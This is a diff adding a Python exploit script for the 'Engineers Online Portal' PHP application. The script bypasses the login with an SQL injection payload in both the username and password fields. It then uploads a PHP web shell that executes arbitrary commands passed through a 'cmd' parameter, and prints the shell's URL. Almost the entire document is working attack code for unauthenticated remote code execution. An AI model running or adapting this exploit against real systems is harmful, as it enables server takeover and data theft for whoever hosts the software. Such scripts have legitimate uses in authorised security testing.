@@ -1,0 +1,64 @@
+# Title: Engineers Online Portal - SQLi to Remote Code Execution (RCE) (Unauthenticated)
+# Exploit Author: Sentinal920 
+# Date: 2021-10-13
+# Vendor Homepage: https://www.sourcecodester.com/php/13115/engineers-online-portal-php.html
+# Version: 1
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/nia_munoz_monitoring_system.zip
+# Tested On: Windows 10, XAMPP 
+
+
+import requests
+import os
+import sys
+from requests_toolbelt.multipart.encoder import MultipartEncoder
+import string
+import random
+
+
+# CHANGE URL
+url = "http://192.168.182.150"
+
+
+
+eng_url = '/login.php'
+admin_url = '/admin/login.php'
+stud_url = '/student_avatar.php'
+random = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(9))
+rand = random+'.php'
+
+
+def get_session():
+	
+	headers = {"Content-Type": "application/x-www-form-urlencoded"}
+	body = "username='or'1'%3D'1&password='or'1'%3D'1"
+	r = requests.post(url+eng_url,headers=headers,data=body)
+	return r.headers['Set-Cookie']
+
+def upload_shell():
+	cookie = get_session()
+	headers = {
+			"Cookie":cookie,
+			"Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarycsJyOt8gMnUxMBE7"
+		  }
+
+	body = """------WebKitFormBoundarycsJyOt8gMnUxMBE7
+Content-Disposition: form-data; name="image"; filename="""+rand+"""
+Content-Type: text/plain
+
+<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
+
+------WebKitFormBoundarycsJyOt8gMnUxMBE7
+Content-Disposition: form-data; name="change"
+
+
+------WebKitFormBoundarycsJyOt8gMnUxMBE7--"""
+
+	r2 = requests.post(url+stud_url,headers=headers,data=body)
+	return rand
+
+def exploit():
+	print('')
+	print('Webshell uploaded at:')
+	print(url+'/admin/uploads/'+upload_shell()+'?cmd=whoami')
+	print('')
+exploit()
